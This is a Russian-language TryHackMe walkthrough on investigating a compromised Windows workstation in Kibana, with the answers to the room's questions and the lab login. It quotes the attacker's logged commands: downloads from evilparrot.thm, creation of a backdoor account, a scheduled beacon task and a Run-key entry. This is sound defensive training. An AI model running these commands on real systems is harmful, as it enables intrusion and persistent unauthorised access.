[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Servidae: Log Analysis in ELK](https://tryhackme.com/r/room/servidae) 

Всего 11 заданий:
## Задание 1
В этой комнате мы проанализируем данные журнала со скомпрометированной рабочей станции с помощью интерфейса Kibana. В рамках задач этой комнаты мы изучим компоненты стека Elastic (ELK) и получим представление о различных функциях поиска и фильтрации, доступных в Kibana. Нашей конечной целью будет расшифровка действий, выполняемых злоумышленником в затронутой системе. Кроме того, чтобы гарантировать, что наши выводы будут полезны на практике, мы сопоставим индикаторы компрометации (IOC), выявленные в журналах, с соответствующими тактиками и методами, изложенными в структуре MITRE ATT&CK .

Цели комнаты

Ознакомьтесь со стеком Elastic ( ELK ) и его компонентами.
Понять важность анализа данных журналов для обнаружения и расследования инцидентов безопасности.
Познакомьтесь с Kibana и ее ключевыми функциями для анализа, визуализации и исследования данных.
Получите практический опыт анализа данных журналов для выявления реальных угроз безопасности и аномалий.
Предварительные условия для комнаты

Общее знакомство с Windows — ознакомьтесь с модулем «Основы Windows».
Общий контекст SIEM и способы их использования. Введение в SIEM — отличное место для этого.
Когда будете готовы, нажмите  кнопку Start Machine  , прикрепленную к этой задаче! Я рекомендую начать ее сейчас, так как Elasticsearch может потребоваться до 5 минут для полного запуска.

### Ответьте на вопросы ниже
Нажмите и продолжайте обучение!
```commandline
Ответ не нужен
```

## Задание 2
Стек Elastic ( ELK )

Elastic Stack (обычно и ранее известный как ELK Stack ) — это набор программных компонентов с открытым исходным кодом, разработанных Elastic . «Стек» в основном состоит из трех основных продуктов: Elasticsearch , Logstash и Kibana . При совместном использовании Elastic Stack становится очень универсальным набором инструментов, который можно использовать для широкого спектра вариантов использования, включая анализ журналов, мониторинг производительности приложений, аналитику безопасности и бизнес-аналитику. Компоненты стека разработаны для бесперебойной совместной работы, что позволяет упростить сбор , обработку и анализ данных из различных источников.

Для лучшего понимания мы можем обсудить каждый компонент более подробно:

Графическая диаграмма каждого компонента Elastic Stack - Beats, Logstash, Elasticsearch и Kibana

Elasticsearch

Логотип Elasticsearch

Являясь центральным компонентом Elastic Stack, Elasticsearch представляет собой распределенную поисковую и аналитическую систему с открытым исходным кодом, предназначенную для хранения и индексирования больших объемов данных. Ее высокомасштабируемая система может хранить и искать различные типы данных, включая структурированные, неструктурированные и полуструктурированные данные. Elasticsearch построен на основе Apache Lucene , библиотеки поисковой системы с открытым исходным кодом, и предоставляет простой REST API для индексирования, поиска и анализа данных.

В типичной среде SOC аналитик может использовать Elasticsearch для хранения и индексации журналов безопасности,  таких как журналы брандмауэра , для быстрого поиска и анализа.

Logstash

Логотип Logstash

Logstash — это инструмент для приема и обработки данных,который в основном используется для сбора, обработки и преобразования данных из различных источников и подготовки их к хранению в Elasticsearch или других системах. Например, Logstash может принимать и анализировать журналы из нескольких источников и систем, а затем отправлять данные в Elasticsearch для индексации и хранения.

Logstash предназначен для обработки различных типов данных, включая журналы , метрики , события и другие структурированные или неструктурированные данные. Он предоставляет обширную коллекцию входных, фильтрующих и выходных плагинов, которые можно использовать для сбора данных из многих источников, их анализа и преобразования , а затем отправки в различные пункты назначения.

В примере среды SOC аналитик может использовать Logstash для анализа, преобразования и стандартизации журналов безопасности различных антивирусных и EDR- решений, работающих на предприятии.

Кибана

Логотип Кибана

Kibana — это интерактивный графический и визуальный интерфейс, на котором работает Elastic Stack. Kibana предоставляет удобный интерфейс, позволяющий пользователям создавать интерактивные панели мониторинга , визуализации и отчеты на основе данных, хранящихся в Elasticsearch . Наряду с возможностью поиска и фильтрации событий журнала, Kibana поддерживает различные диаграммы для отчетности и визуализации, включая линейные диаграммы, столбчатые диаграммы, круговые диаграммы, тепловые карты и многие другие.

Использование Kibana в качестве интерактивного интерфейса для данных, хранящихся в Elasticsearch, позволяет быстро получать информацию и находить закономерности. В сочетании с остальной частью Elastic Stack Kibana является важнейшим решением для анализа и понимания больших объемов данных.

В среде SOC Kibana будет выступать в качестве интерфейса интерфейса для визуализации и мониторинга событий безопасности в режиме реального времени, например, графиков сетевого трафика, основных источников оповещений безопасности или карты, показывающей геолокацию потенциально вредоносных IP-адресов.

Битс

Логотип Beats

Использование Beats не является обязательным в Elastic Stack, но они могут иметь решающее значение для предоставления эффективных и безопасных возможностей сбора данных . Beats — это легкие «отправители» данных, которые собирают различные типы данных из разных источников (конечных точек) и затем могут напрямую пересылать эти данные в Elasticsearch или Logstash для дальнейшей обработки. Организации могут адаптировать различные Beats для конкретных вариантов использования, таких как сбор системных журналов , данных сетевого трафика или метрик с серверов и приложений.

Beats занимает меньше места, чем Logstash, что делает его более подходящим для простых случаев использования или там, где использование ресурсов является проблемой, например, для устройств IoT или небольших систем. Logstash , с другой стороны, является более надежным и сложным инструментом для обработки и преобразования данных, что делает его более подходящим для сложных случаев использования, где данные требуют значительного преобразования перед сохранением или анализом.

Теперь, когда мы лучше понимаем основные компоненты, составляющие Elastic Stack, давайте перейдем к гораздо более практичному практическому сценарию !

### Ответьте на вопросы ниже
Как называется библиотека поисковой системы с открытым исходным кодом, на которой построен Elasticsearch?
```commandline
Apache Lucene
```
Какой компонент Elastic Stack вы бы использовали для расширенной фильтрации и обработки данных перед их сохранением?
```commandline
Logstash
```

## Задание 3
Взломанная рабочая станция: сценарий

Билл Смит, старший финансовый директор в Servidae Industries , заявил, что получил электронное письмо от 
неизвестного отправителя, содержащее вложенный файл PDF, который требовал его действий. На первый взгляд, это 
электронное письмо казалось законным, и он скачал и открыл его без каких-либо подозрений. Через некоторое время Билл 
заметил, что его компьютер ведет себя ненормально, и связался со службой ИТ-поддержки, заявив, что его рабочая 
станция работает медленно и периодически зависает. Вскоре после этого оповещения безопасности указали на 
подозрительную сетевую активность и несанкционированные команды, выполненные на рабочей станции Билла.

Копия предупреждения безопасности от решения организации Endpoint Detection & Response ( EDR ) гласит:

Это автоматическое оповещение безопасности, сгенерированное EndDefender EDR . Подозрительная сетевая активность и 
потенциальный удаленный доступ были обнаружены на рабочей станции SERVIDAE-BOB-FIN-04 в указанном диапазоне времени: 
11 мая 2023 г. @ 18:45:00.000 по 11 мая 2023 г. @ 19:01:00.000.

Как аналитик SOC в Servidae Industries , вы должны расследовать оповещение безопасности, просматривая журналы, чтобы 
определить причину и характер подозрительной активности на компьютере Билла. К счастью, организация недавно внедрила 
решение Elastic Stack , и был установлен Elastic Agent для сбора журналов с рабочей станции Билла. У нас есть доступ 
к панели управления Kibana, которая содержит журналы с момента инцидента. Давайте пройдемся по расследованию и 
определим, были ли какие-либо признаки компрометации учетной записи или вредоносной активности пользователя.

### Ответьте на вопросы ниже
Я готов к расследованию!
```commandline
Ответ не нужен
```

## Задание 4
Доступ к Кибане

Теперь мы готовы получить доступ к панели управления Kibana. Убедитесь, что вы уже нажали Start Machine в первой задаче. Теперь вы можете запустить AttackBox, нажав кнопку Start AttackBox в правом верхнем углу этой комнаты.

Перейдите http://MACHINE_IPв веб-браузере AttackBox.

Вы должны увидеть страницу входа Elastic. Пожалуйста, войдите, используя следующие учетные данные:

Имя пользователя:elastic
Пароль:1N5qMlh7AYXYzjxad*02
Панель входа в Kibana

Если вы видите ответ Bad Gateway , дайте системе больше времени для запуска Elasticsearch и Kibana . Обычно запуск каждой службы может занять до 5 минут.

Обнаружить

По умолчанию вы будете перенаправлены на домашнюю панель управления, которая отображает несколько опций для управления Elastic Stack и интеграциями. Kibana — невероятно мощный инструмент визуализации, и мы не можем охватить все, что он предлагает в этой комнате. Чтобы сосредоточиться на нашем расследовании, перейдите на страницу Discover , которую можно найти, щелкнув значок меню слева и выбрав Discover на вкладке Analytics .

Панель инструментов Kibana с выделенной вкладкой Discover

Вкладка Discover в Kibana — это пользовательский интерфейс , который позволяет вам исследовать, искать и анализировать данные в режиме реального времени. Это мощный инструмент, который поможет вам быстро и легко находить закономерности, аномалии и тенденции на основе данных журнала. Для этого вы можете искать определенные термины, поля или закономерности в данных и добавлять многочисленные фильтры, чтобы сузить результаты на основе таких критериев, как временной диапазон, источник или тип.

Фильтр времени

Системы и конечные точки создают огромное количество журналов, поэтому крайне важно использовать фильтры для их эффективного изучения. Фильтр времени Kibana , для начала, позволяет сузить записи до определенного временного диапазона, что упрощает идентификацию событий, предшествовавших инциденту и произошедших во время него.

Примечание: По умолчанию Kibana использует местное время вашего браузера для определения способа представления событий журнала. Чтобы добиться согласованности с этим пошаговым руководством, убедитесь, что ваш часовой пояс в Kibana установлен на Europe/London .

Настройки часового пояса можно изменить здесь:http://MACHINE_IP/app/management/kibana/settings?query=time+zone

Страница настроек Kibana, на которой выделена настраиваемая опция часового пояса

Для этого расследования в оповещении нашей команды упоминалось, что инцидент произошел 11 мая 2023 года, примерно между 18:45-19:01 . Давайте отфильтруем панель управления, чтобы включить только журналы за этот период.

Сначала нажмите на значок быстрого выбора даты :

Инструмент быстрого выбора даты Kibana

По умолчанию Kibana всегда показывает журналы за последние 15 минут. Щелкните вкладку Absolute в раскрывающемся окне даты. Затем вы можете выбрать дату и время начала через пользовательский интерфейс календаря и времени или введя дату в текстовом поле Start date . Установите значение May 11, 2023 @ 18:45:00.000.

Панель выбора даты Кибана, на которой выделены выбранная дата и время 11 мая 2023 г. @ 18:45:00.000

После установки нажмите кнопку «Сейчас» и сделайте то же самое, на этот раз установив абсолютную дату и время 11 мая 2023 г. @ 19:01:00.000 .

Панель выбора даты Кибана, на которой выделены выбранная дата и время 11 мая 2023 г. @ 19:01:00.000

Нажмите зеленую кнопку «Обновить» , и вы должны увидеть некоторые журналы и показатели!

Это отличное начало; мы сузили круг поиска до интересующих нас дат и времени.

### Ответьте на вопросы ниже
Обновите фильтр даты и времени, как указано. Сколько всего попаданий было зафиксировано в течение выбранного периода времени?
```commandline
920
```

## Задание 5
Доступные поля

Теперь , когда мы применили желаемый временной диапазон, мы можем начать изучать различные поля  , доступные в нашем наборе данных. В Kibana поля относятся к отдельным элементам данных или атрибутам, извлеченным из данных журнала, и доступны для поиска, фильтрации и визуализации. Поля можно рассматривать как  столбцы в электронной таблице, где каждая строка представляет событие журнала, а каждый столбец представляет определенный атрибут события.

В случае инцидента Билла мы знаем, что злонамеренный злоумышленник потенциально получил удаленный доступ к его рабочей станции. В этом контексте мы можем сделать вывод, что злоумышленник, вероятно, запускал команды в системе, пытался повысить привилегии, получал доступ к файлам, пытался поддерживать постоянство и многое другое. Для этого расследования есть несколько полей из собранных журналов, которые могут быть интересны для нас для фильтрации:

agent.name : в этом поле указывается имя программного агента или рабочей станции, ответственных за генерацию события журнала.
event.category : Это поле указывает характер событий, связанных с выполнением процесса или действиями командной строки.
process.command_line : Это поле захватывает всю строку командной строки процесса. Вы можете использовать это поле для поиска конкретных команд, которые мог использовать злоумышленник.
process.executable : в этом поле указывается путь или имя исполняемого файла, связанного с процессом.
process.name : это поле фиксирует имя процесса.
process.parent.name : это поле фиксирует имя родительского процесса.
related.user: это поле собирает информацию о пользователе, связанном с событием, такую ​​как его имя пользователя, идентификатор или другую информацию, специфичную для пользователя.
source.ip : в этом поле фиксируется исходный IP-адрес, связанный с сетевым событием.
destination.ip : в этом поле фиксируется IP-адрес назначения, связанный с сетевым событием.
Полное руководство по полям ECS (Elastic Common Schema) см. в Справочнике полей ECS .

Все доступные для выбора поля находятся под заголовком Доступные поля на левой панели в Kibana. Найдите имя одного 
из указанных выше полей, наведите на него курсор и щелкните синий значок плюса (+) . Это добавит поле в качестве 
визуального столбца. Кроме того, вы можете щелкнуть по любому имени поля, чтобы открыть окно, в котором выделены 
верхние значения в текущем наборе данных для этого поля. Вы также можете искать имена полей напрямую, используя 
панель Поиск имен полей в верхней части левой панели.

Панель выбора полей Kibana, на которой выделено поле destination.ip и его верхние значения

Функция Top values часто является быстрым способом вывести интересные закономерности или тенденции в журналах. 
Например, мы можем быстро определить, выделяются ли какие-либо IP-адреса, указывающие на потенциальное использование 
сервера управления и контроля ( C2 ) . Мы также можем узнать, какие процессы чаще всего выполняются на 
скомпрометированной рабочей станции или какие учетные записи пользователей используются или создаются.

Примечание: включите поля в порядке, указанном в маркированном списке выше, так как они окажутся полезными при 
анализе действий, которые злоумышленник мог выполнить на взломанной рабочей станции Билла.

### Ответьте на вопросы ниже
Посмотрите на верхние значения в поле destination.ip . Какой IP-адрес выделяется?
```commandline
84.237.252.156
```
Используйте инструмент поиска IP-адресов (например, iplocation.io). Из какой страны происходит этот IP-адрес?
```commandline
Latvia
```
Какое имя процесса чаще всего запускается на скомпрометированной рабочей станции?
```commandline
curl.exe
```
## Задание 6
Сортировка

Чтобы начать отслеживать шаги злоумышленника, мы можем изменить порядок журналов, чтобы показать нам все с начала выбранного нами временного диапазона в порядке возрастания. Щелкните по маленькому значку сортировки рядом с вкладкой «Столбцы» и выберите «Старые-новые» . Журналы будут отображаться от самой ранней до самой поздней временной метки, причем самые старые журналы будут отображаться в верхней части списка, а самые последние — в нижней.

Функция сортировки полей Kibana с выделением опции сортировки по старым-новым временным меткам.

Фильтры полей

Осталось еще 920 результатов для проверки, поэтому давайте отфильтруем их, чтобы начать просмотр команд, которые были запущены на скомпрометированной рабочей станции. Поскольку мы подозреваем, что вредоносный документ, который Билл скачал и выполнил, был  трояном удаленного доступа , у нас должны быть данные журнала, показывающие команды, запущенные злоумышленником от имени Билла.

Нажмите на поле process.command_line на левой панели и выберите " Фильтр по полю присутствует" . Этот фильтр уточнит результаты, показывая только события журнала, содержащие значение в указанном поле. В этом случае он позволяет нам видеть только события журнала, содержащие информацию о конкретных запущенных командах.

Параметр фильтрации полей в Kibana с выделением кнопки для фильтрации любых журналов, содержащих значение process.command_line.

После запуска этого фильтра мы должны увидеть, что результаты на панели гистограммы дат резко уменьшатся до всего лишь 174 событий журнала.

Кроме того, поскольку нас сейчас интересует только рабочая станция Билла, мы можем нажать на agent.name и щелкнуть синий значок плюса (+) рядом с именем рабочей станции Билла SERVIDAE-BOB-FIN-04. Общее количество результатов останется прежним, но это хорошая практика, если мы анализируем журналы из нескольких агентов или источников.

Параметр фильтрации полей в Kibana выделяет кнопку для фильтрации любых журналов, в которых agent.name совпадает с именем агента SERVIDAE-BOB-FIN-04.

Наконец, повторите те же шаги, чтобы отфильтровать поле related.user по пользователю bsmith , так как мы хотим узнать, что было выполнено с учетной записью пользователя Билла Смита.

Параметр фильтрации полей в Kibana с выделением кнопки для фильтрации любых журналов, в которых related.user совпадает с пользователем bsmith.

Анализ процесса командной строки

Теперь мы должны иметь возможность проанализировать журналы, чтобы увидеть, какие команды были запущены. Посмотрите на первую запись журнала в списке, указывающую имя процесса как powershell.exe . Это сразу же вызывает подозрения, так как он был запущен учетной записью пользователя Билла ( bsmith ).

Результаты журнала, выделяющие процесс powershell.exe.

Powershell.exe — исполняемый файл для Windows PowerShell от Microsoft , командной строки и языка сценариев, разработанного для системных администраторов и опытных пользователей. Хотя обычно используется в законных целях, в контексте скомпрометированной рабочей станции финансового руководителя запись в журнале, указывающая на то, что powershell.exe был использован, может стать причиной для беспокойства. Злоумышленники часто используют PowerShell для выполнения вредоносных команд на скомпрометированных системах, поскольку он предоставляет мощный интерфейс для взаимодействия с системой и выполнения сценариев.

Подробности журнала

Давайте рассмотрим подробности этой записи журнала. Это можно сделать, нажав на значок «Развернуть» слева от записи журнала.

Выделите значок «Развернуть» в записи журнала Kibana, чтобы просмотреть сведения о записи журнала powershell.exe.

Это откроет модальное окно Expanded document в правой части страницы. Представьте себе «документ» как набор пар ключ-значение в формате JSON , которые сопоставляются с каждым доступным полем в записи журнала. Когда вы разворачиваете документ в Kibana , вы увидите все поля в записи журнала и их значения.

После открытия мы можем увидеть множество фрагментов метаданных, прикрепленных к этой записи журнала. Прокрутив страницу вниз, мы можем перейти на вторую страницу , которая показывает нам больше информации о том, какой процесс был запущен. В частности, поля message и process.command_line показывают, как злоумышленник, вероятно, получил первоначальный доступ.

Полная запись журнала с указанием сообщения и значений process.command_line.

Если посмотреть на путь файла, становится ясно, что Билл загрузил скрипт PowerShell , замаскированный под счет-фактуру в формате PDF, из полученного им фишингового письма. Мы можем определить, что этот файл был скриптом PowerShell  , по фактическому расширению файла " .ps1 ". Злоумышленники обычно используют технику, называемую "подменой расширения файла", чтобы замаскировать вредоносные файлы под безвредные документы, чтобы обманом заставить пользователей загрузить и выполнить их.

Наличие этого исполняемого файла в журналах в сочетании с предупреждением об удаленном доступе, которое мы получили для рабочей станции Билла, позволяет нам предположить, что этот скрипт PowerShell предоставил злоумышленнику удаленный доступ к рабочей станции Билла. Далее давайте проанализируем, какие действия они могли выполнить в системе.

### Ответьте на вопросы ниже
Каков был идентификатор процесса (PID) потенциально вредоносного скрипта PowerShell?


```commandline
6712
```

Каково было имя родительского процесса , породившего powershell.exe?
```commandline
explorer.exe
```

## Задание 7
Открытие

Структура MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) — это всемирно признанная база знаний и матрица, которая предоставляет полный и структурированный каталог поведения и методов злоумышленников . Она разработана, чтобы помочь организациям понять, классифицировать и смягчить тактику и методы , используемые субъектами угроз во время кибератак.

В контексте MITRE ATT&CK, « Обнаружение » относится к приемам и методам, используемым злоумышленниками для сбора информации о целевой среде, такой как ее сеть, системы и учетные записи пользователей. Оно включает в себя действия, которые помогают злоумышленникам лучше понять инфраструктуру жертвы и выявить потенциальные уязвимости или возможности для дальнейшей эксплуатации.

Прокрутка текущего набора данных показывает несколько интересных команд, которые злоумышленник, по-видимому, выполнил после получения первоначального доступа:

Список журналов, содержащих команды: whoami.exe, HOSTNAME.EXE, ipconfig.exe, NETSTAT.EXE и tasklist.exe

Как и при запуске PowerShell, системные администраторы и законные пользователи обычно используют указанные выше команды для управления и устранения неполадок в системах Windows. Однако в сочетании с другой подозрительной активностью эти журналы, по-видимому, являются индикаторами компрометации (IOC). Злоумышленник, вероятно, использует эти команды для сбора информации о системе и выявления потенциальных уязвимостей или целей. Сомнительно, что Билл из финансового отдела запустил бы эти команды в командной строке.

Это очень распространено на «фазе перечисления» атаки на внутреннюю сеть. Информация, полученная при запуске этих команд, может помочь злоумышленнику определить тип системы, к которой он получил доступ, и определить, какой тип доступа у него есть для проведения дальнейших атак, получения настойчивости или горизонтального перемещения по сети.

Загрузка файлов для автоматического обнаружения

Двигаясь дальше, мы видим очень подозрительный командлет PowerShell :powershell -c Invoke-WebRequest

Событие журнала, содержащее командлет PowerShell Invoke-WebRequest

Командлет Invoke-WebRequest извлекает данные с веб-сервера и может использоваться для загрузки файлов, взаимодействия с REST API и выполнения других операций HTTP/HTTPS. Его можно использовать в законных целях, как и другие рассмотренные нами команды. Однако злоумышленники также могут использовать командлет Invoke-WebRequest для загрузки вредоносных файлов или извлечения данных из скомпрометированной системы. Для проверки разверните журнал на изображении выше и посмотрите на поле process.command_line .

Взгляните на всю выполненную команду:

powershell -c Invoke-WebRequest -Uri "http://evilparrot.thm/winPEASany.exe" -OutFile "winPEAS.exe"

Из этого вывода следует, что злоумышленник использовал командлет Invoke-WebRequest для загрузки файла " winPEASany.exe " с сервера злоумышленника, сохранив его как winPEAS.exe . Если вы не знакомы с winPEAS , быстрый поиск в Google приведет вас к файлу winPEAS GitHub README , который описывает его как скрипт, который ищет возможные пути повышения привилегий на хостах Windows. Он может быстро определить потенциальные пути повышения привилегий, ища неправильно настроенные запланированные задачи, небезопасные ключи реестра и другие распространенные уязвимости.

Инструменты автоматического подсчета, такие как winPEAS, довольно часто используются злоумышленниками (если им удается незаметно внедрить их на взломанный хост), и это весьма красноречивый признак взлома рабочей станции Билла.

Запросы в реестр

После запуска winPEAS.exe, похоже, злоумышленник нашел потенциальный путь для повышения привилегий из выходных 
данных скрипта и сделал несколько запросов в реестр Windows для проверки. Реестр Windows представляет собой 
иерархическую базу данных, в которой хранятся параметры конфигурации и опции для операционной системы Windows, 
пользователей, политик и установленных приложений. Эти запросы идентифицируются командой, reg queryзапускаемой reg.exe.

Две длинные записи, содержащие команды запроса реестра

В частности, злоумышленник запрашивает реестр, чтобы узнать, установлена ли запись AlwaysInstallElevated . Эта 
запись определяет, могут ли пользователи устанавливать программы или обновления в системе с повышенными привилегиями,
что является риском безопасности, если установлено без надлежащего контроля. Это известный метод повышения 
привилегий , и он задокументирован в этом блоге Juggernaut-Sec, если вам интересно, как это работает.

Далее мы будем искать индикаторы того, что этот метод повышения привилегий был использован. Если злоумышленнику 
удалось получить более высокие уровни доступа к системе Билла, он мог бы выполнять более вредоносные действия, такие 
как создание бэкдоров для постоянного доступа или изменение конфигураций системы.

### Ответьте на вопросы ниже
Каково доменное имя сервера злоумышленника, на котором размещен исполняемый файл winPEAS ?

```commandline
evilparrot.thm
```

Каков полный путь к запрошенной записи реестра HKEY_LOCAL_MACHINE ?
```commandline
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

## Задание 8
Повышение привилегий

В контексте MITRE ATT&CK, « Повышение привилегий » относится к тактике, используемой злоумышленниками для получения более высоких привилегий доступа в скомпрометированной системе или сети. Она включает в себя использование методов и использование неправильных конфигураций для повышения привилегий из изначально скомпрометированного состояния с целью получения большего контроля и доступа к конфиденциальным ресурсам, данным или функциональным возможностям.

Повышение привилегий обычно выполняется после того, как противник получил начальную точку опоры или несанкционированный доступ к системе. Повышая привилегии, злоумышленники увеличивают свои возможности горизонтального перемещения в сети, доступа к конфиденциальным данным, выполнения вредоносных действий и потенциального уклонения от обнаружения средствами безопасности. Понимание и обнаружение методов повышения привилегий имеет решающее значение для эффективной защиты и смягчения последствий от продвинутых злоумышленников.

Использование KQL для выявления повышения привилегий

Теперь, когда мы определили путь повышения привилегий, который, вероятно, выбрал злоумышленник, мы можем подтвердить эту теорию, углубившись в журналы. Исследуя технику повышения привилегий AlwaysInstallElevated , мы обнаружили, что она обычно используется злоумышленником, который получает и запускает вредоносный файл MSI , который затем запускается с повышенными привилегиями, даже если пользователь, запускающий файл MSI, не является администратором. Файл MSI (Microsoft Installer) — это формат, используемый для установки программ в системах Windows.

Обычно злоумышленник может создать вредоносный установщик MSI, который создаст повышенное (привилегированное) соединение со злоумышленником или установит программу, которая создаст в системе «черную» учетную запись администратора с именем пользователя и паролем, установленными злоумышленником.

Мы можем использовать другой метод фильтрации данных в Kibana - KQL ( Kibana Query Language) . KQL - это метод поиска, который позволяет вам напрямую искать определенные поля, значения или шаблоны в ваших данных и объединять несколько условий поиска с использованием булевой логики. В этом сценарии мы можем выполнить поиск, чтобы извлечь любые журналы, содержащие " msi " в поле process.command_line . Мы должны увидеть, что злоумышленник получил (загрузил) и выполнил вредоносный файл MSI, если наши инстинкты были верны. Синтаксис, который мы можем ввести в строке поиска " Filter your data using KQL syntax ", следующий:

process.command_line: *msi*

Этот запрос будет соответствовать любому событию журнала, где поле process.command_line содержит подстроку « msi ». Символ * является подстановочным знаком, который соответствует нулю или более символов.

Поле поиска Kibana, выделяющее запрос поиска process.command_line: *msi* KQL

После ввода запроса нажмите Enterили щелкните « Обновить ». Должно быть возвращено три результата:

События журнала, содержащие команду PowerShell Invoke-WebRequest и выполнение файла adminshell.msi

Первый результат, похоже, снова использует командлет PowerShell Invoke-WebRequest для загрузки вредоносного файла MSI. Второй журнал событий, похоже, запускает вредоносный файл с помощью msiexec.exe — утилиты, используемой для установки файлов .msi. Чтобы это проверить, нам нужно будет развернуть каждую из этих записей, чтобы просмотреть все поле process.command_line .

Выполнение этого файла, вероятно, предоставило злоумышленнику повышенную оболочку (командную строку) на скомпрометированной рабочей станции. Из-за этого нам придется изменить некоторые фильтры, чтобы убедиться, что мы можем увидеть эти повышенные события журнала в следующей задаче.

### Ответьте на вопросы ниже
Каково имя вредоносного .msi- файла?
```commandline
adminshell.msi
```

## Задание 9
Упорство

В контексте MITRE ATT&CK, « Упорство » относится к тактикам и методам, используемым злоумышленниками для поддержания долгосрочного доступа к скомпрометированной системе или сети, даже после первоначального доступа. После получения повышенного доступа к скомпрометированной системе злоумышленник обычно ищет способы сохранить свой доступ и получить упорство.

Получение настойчивости обычно подразумевает создание плацдарма или бэкдора в системе, часто путем  создания новой учетной записи пользователя , изменения системных настроек или файлов, установки руткита или планирования задачи . Получая настойчивость, злоумышленники могут продолжать извлекать данные, распространять вредоносное ПО и выполнять другие вредоносные действия без обнаружения.

Как упоминалось в предыдущей задаче, злоумышленник, вероятно, использовал параметр реестра AlwaysInstallElevated для получения повышенных прав командной оболочки на скомпрометированной рабочей станции Билла. Из-за этого нам придется изменить установленные нами фильтры. Это связано с тем, что когда процесс запускается с повышенными привилегиями, он обычно запускается в контексте учетной записи пользователя "SYSTEM".

Сначала давайте очистим фильтр process.command_line: *msi* KQL , так как нам нужно расширить область действия (не забудьте нажать на зеленый значок «Обновить» после очистки строки поиска). Затем измените фильтр поля related.user с bsmith на SYSTEM . Это можно сделать, удалив существующий фильтр и добавив его снова с SYSTEM в качестве фильтра на этот раз.

Панель фильтров Kibana, на которой показано удаление фильтра related.user: bsmith

Панель фильтров Kibana, на которой выделено добавление фильтра related.user: SYSTEM

Сохранение : Создание учетных записей администратора

Кратко взглянув на гистограмму в верхней части нашей панели, можно увидеть небольшой всплеск активности в 18:54:00 , что примерно соответствует времени, когда злоумышленник получил повышенный доступ. Гистограмма отображает частоту данных в каждом временном блоке в виде полосы, при этом каждая полоса представляет отдельный временной блок. Щелкните по временному блоку для 18:54:00 , что обновит временной фильтр и еще больше сузит результаты.

Гистограмма временной шкалы в Кибане, выделяющая всплеск событий в 18:54

Мы сразу видим, что некоторые подозрительные команды выполняются в 18:54:04 . Конкретная команда — это net userкоманда. Команда net user используется в Windows для управления и создания учетных записей пользователей . Весь запуск команды (путем раскрытия события журнала) показывает, что была создана новая учетная запись пользователя, пароль был установлен как бессрочный, а изменение пароля было запрещено.

События журнала, указывающие на использование команд net user и net localgroup

net user backdoor backdoor /add /expires:never /passwordchg:no

Вторая выделенная команда net localgroup Administrators добавляет нового пользователя в локальную группу администраторов на скомпрометированной системе. Объединив эти команды, злоумышленник создал нового административного пользователя, которого он может использовать для сохранения привилегированного доступа к рабочей станции Билла, даже если его первоначальный метод компрометации (Invoice.pdf.ps1) будет обнаружен и удален.

Настойчивость : Планирование задач

Давайте продолжим, вернувшись к нашей исходной временной шкале, чтобы увидеть остальные события. Для этого нажмите на значок календаря и выберите « 11 мая 2023 г. @ 18:45:00.000 — 11 мая 2023 г. @ 19:01:00.000 » в разделе « Недавно использованные диапазоны дат »:

Панель выбора даты и времени в Kibana, на которой выделен выбор оригинальной временной шкалы 18:45 - 19:01

Кроме того, удалите фильтр related.user , поскольку нас по-прежнему интересуют любые процессы, выполненные пользователем bsmith. Затем щелкните по следующему пику записей в 18:56:30 , чтобы перейти к этому временному интервалу. Разбиение журналов таким образом может помочь повысить эффективность анализа журналов, позволяя вам сосредоточиться на определенных периодах или событиях, представляющих интерес.

Гистограмма временной шкалы в Кибане, выделяющая всплеск событий в 18:56:30

Сразу же мы видим использование командлета Invoke-WebRequest , к которому мы теперь привыкли. Похоже, что злоумышленник загрузил файл с именем beacon.batс http://evilparrot.thmсервера. Файл .bat (сокращение от "batch") — это файл сценария, используемый в Windows для автоматизации задач. Он содержит ряд команд, которые могут быть выполнены последовательно интерпретатором командной строки.

Название « маяк » может относиться к  технике управления и контроля ( C2 ) , используемой злоумышленниками для поддержания устойчивости и связи с скомпрометированной системой. Маяк может периодически отправлять сигналы или «пинги» на сервер C2 для получения команд или извлечения данных.

События журнала, указывающие на выполнение файла beacon.bat

После нескольких событий журнала, указывающих на загрузку, похоже, что злоумышленник запустил файл beacon.bat , за которым немедленно последовало несколько команд cURL , вероятно, отправляющих данные или сигналы на http://evilparrot.thmсервер.

Гистограмма временной шкалы в Кибане, выделяющая события в 18:57:00

Возвращаясь снова к нашей исходной временной шкале и сужая следующий временной блок до 18:57:00 , мы видим следующую интересную команду — schtasksкоманду.

Событие журнала, отражающее использование команды schtasks

Как упоминалось ранее, злоумышленники часто используют schtasks.exe (планировщик задач Windows) для поддержания устойчивости на скомпрометированной системе. Создав запланированную задачу, которая запускает вредоносный скрипт или исполняемый файл в определенное время или с определенным интервалом, злоумышленник может гарантировать, что его вредоносное ПО или бэкдор будут выполнены автоматически, даже если система будет перезагружена или злоумышленник потеряет первоначальный доступ к системе.

На основании всей приведенной ниже команды можно сделать вывод, что злоумышленник создал новую автоматизированную задачу под названием « Beacon », которая запускает файл beacon.bat каждую минуту от имени пользователя System (с повышенными правами администратора):

schtasks /create /tn "Beacon" /tr "C:\Users\bsmith\Desktop\beacon.bat" /sc minute /mo 1 /ru "System"

Сохранение : Редактирование реестра

Последний метод сохранения, который мы можем наблюдать, снова связан с реестром Windows и происходит сразу после журнала событий schtasks.exe.

События журнала, отражающие использование команд reg add и reg query

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "BackdoorShell" /t REG_SZ /d "C:\Users\bsmith\Desktop\adminshell.msi" /f

Раскрывая это событие журнала, мы можем быстро определить, что злоумышленник получил доступ к реестру Windows и добавил ( reg add) новую запись. Реестр Windows — это центральная база данных, в которой хранятся важные сведения о конфигурации операционной системы и ее приложений. Изменяя реестр таким образом, злоумышленники могут создать постоянную точку опоры в системе для сохранения доступа даже после перезагрузки или обновления системы.

В этом случае злоумышленник добавил новую запись в ключ « Run », что приводит к автоматическому выполнению файла adminshell.msi каждый раз, когда Билл входит в систему. Как мы помним ранее, файл adminshell.msi — это вредоносный файл, созданный злоумышленником для запуска удаленной оболочки с повышенными правами доступа.

Учитывая все, что мы проанализировали до сих пор, становится совершенно очевидно, что злоумышленник смог получить начальный доступ к рабочей станции Билла, использовал методы обнаружения, чтобы определить путь повышения привилегий, и внес несколько изменений в конфигурацию, чтобы создать бэкдоры и сохранить присутствие на скомпрометированной системе.

### Ответьте на вопросы ниже
Каково имя учетной записи пользователя ,  которую злоумышленник создал для сохранения привилегированного доступа?
